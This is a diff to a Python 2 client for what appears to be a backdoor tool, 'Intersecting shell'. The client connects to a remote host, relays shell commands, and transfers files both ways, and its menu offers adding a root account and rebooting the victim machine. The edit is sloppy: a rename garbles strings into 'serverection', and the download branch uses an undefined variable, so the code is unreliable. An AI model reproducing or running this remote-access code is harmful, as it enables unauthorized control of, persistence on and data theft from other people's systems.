@@ -20,30 +20,34 @@ socksize = 4096
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 try:
-    conn.connect((HOST, PORT))
-    print("[+] New connection established!")
+    server.connect((HOST, PORT))
+    print("[+] New serverection established!")
     print("[+] Starting Intersecting shell....")
-    print "[+] Type ':help' to view all available commands"
+    print("[+] Type ':help' for all commands.")
+    print("[+] Available Modules: ")
+    server.send(":mods")
+    data = server.recv(socksize)
+    print data
 except:
     print("[!] Connection error!")
     sys.exit(2)
 
 
 while True:
-    data = conn.recv(socksize)
+    data = server.recv(socksize)
     cmd = raw_input(data)
-    conn.sendall(str(cmd))
+    server.sendall(str(cmd))
 
     if cmd == (':killme'):
         print("[!] Shutting down shell!")
-        conn.close()
+        server.close()
         sys.exit(0)
 
     elif cmd.startswith(':download'):
         getname = msg.split(" ")
         rem_file = getname[1]
         filename = rem_file.replace("/","_")
-        data = conn.recv(socksize)
+        data = server.recv(socksize)
         newfile = file(filename, "wb")
         newfile.write(data)
         newfile.close()
@@ -57,7 +61,7 @@ while True:
         sendfile = open(loc_file, "r")
         filedata = sendfile.read()
         sendfile.close()
-        conn.sendall(filedata)
+        server.sendall(filedata)
 
     elif cmd == (":exec"):
         print("Command not yet fully implemented!")
@@ -72,7 +76,7 @@ while True:
         print(" :addroot <name>   | add new root account")
         print(" :reboot           | reboot remote host system")
         print(" :help             | display this menu")
-        print(" :killme           | shuts down shell connection\n")
+        print(" :killme           | shuts down shell serverection\n")
         print("* If the shell appears to hang after sending or receiving data, press [enter] and it should fix the issue.")
 
-conn.close()
+server.close()
